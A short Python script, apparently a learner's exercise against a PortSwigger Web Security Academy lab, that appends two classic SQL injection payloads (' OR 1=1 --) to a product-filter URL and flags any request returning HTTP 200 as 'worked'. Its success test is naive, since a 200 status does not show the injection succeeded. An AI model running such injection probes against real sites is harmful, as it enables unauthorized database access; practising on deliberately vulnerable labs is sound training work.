print("this is working")
import requests
# ------------------- SQL Error Based injection-------------------------
ORpayloads = [" ' OR 1=1 -- ", " ' OR '1'='1 -- "]


def or_injection(url):
    print("trying error based injection with or payload.......")
    for i in range(0, len(ORpayloads)):
        # print("1")
        r = requests.get(url+ORpayloads[i])
        # print("2")
        if r.status_code == 200:
            # print("3")
            print("{} worked!".format(url+ORpayloads[i]))
url="https://0ad40036038d9b6d85e45faf005000ad.web-security-academy.net/filter?category=Accessories"
or_injection(url)
